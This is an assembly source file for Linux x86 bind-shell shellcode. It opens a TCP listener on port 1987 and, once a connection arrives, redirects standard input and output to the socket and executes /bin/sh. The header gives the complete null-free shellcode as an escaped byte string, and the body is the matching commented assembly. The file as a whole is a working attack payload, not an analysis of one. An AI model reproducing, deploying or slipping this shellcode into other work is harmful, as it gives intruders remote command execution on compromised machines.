; bind-linux-x86-shellcode.asm
; For Linux x86.
;
; Opens a remote /bin/sh on port 1987.
;
; Carlos Reventlov <carlos@reventlov.com>.
; First draft of this program dates back to 2007.
;
; Please see also bind-linux-x86.asm for commented full source code.
;
; DISCLAIMER
;
; ** No zeros were used on the making of this program. **
;
; Shellcode
;   \x31\xd2\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6
;   \xfe\xc3\x52\x66\x68\x07\xc3\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3
;   \x02\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56
;   \x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f\xcd\x80\x49
;   \x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89
;   \xe1\xb0\x0b\xcd\x80

global _start

section .text

_start:
  ; edx = 0
  xor edx, edx

  ; socketcall(SYS_SOCKET, [ AF_INET, SOCK_STREAM, IPPROTO_TCP ])
  push byte 0x06
  push byte 0x01
  push byte 0x02
  mov ecx, esp
  mov bl, 0x01
  mov al, 0x66
  int 0x80
  mov esi, eax

  ; socketcall(SYS_BIND, [ <sock>, <address>, sizeof sockaddr_in])
  inc bl
  push edx
  push word 0xc307
  push bx
  mov ecx, esp
  push byte 0x10
  push ecx
  push esi
  mov ecx, esp
  mov bl, 0x02
  mov al, 0x66
  int 0x80

  ; socketcall(SYS_LISTEN, [ <sock>, 0 ])
  push edx
  push esi
  mov ecx, esp
  mov bl, 0x04
  mov al, 0x66
  int 0x80

  ; socketcall(SYS_ACCEPT, [ <sock>, 0, 0 ])
  push edx
  push edx
  push esi
  mov ecx, esp
  mov bl, 0x05
  mov al, 0x66
  int 0x80

  mov ebx, eax      ; Saving fd argument for dup2()

  push byte 0x02    ; Loop boundary.
  pop ecx

 loop:
  mov al, 0x3f
  int 0x80
  dec ecx           ; Decreasing STD*_FILENO
  jns loop

  ; execve("/bin//sh", ["/bin//sh"], 0)
  push edx
  push dword 0x68732f2f
  push dword 0x6e69622f
  mov ebx, esp
  push edx
  push ebx
  mov ecx, esp
  mov al, 0x0b
  int 0x80

